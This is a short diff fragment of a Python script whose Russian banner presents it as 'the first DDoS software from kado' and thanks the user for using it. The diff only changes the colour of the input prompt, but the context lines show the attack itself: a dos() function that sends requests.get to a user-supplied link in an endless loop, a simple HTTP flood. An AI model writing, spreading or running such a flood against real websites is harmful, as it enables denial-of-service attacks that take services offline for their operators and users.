@@ -21,7 +21,7 @@ ______    _
                                                                                                                             
               это первый ддос софт от кадо) спасибо за использование!                                                        
       ''') 
-link = input(f'{COLOR_CODE["BLUE"]}[$] Введите ссылку: ')
+link = input(f'{COLOR_CODE["RED"]}[$] Введите ссылку: ')
 def dos():
  while True:
   requests.get(link)
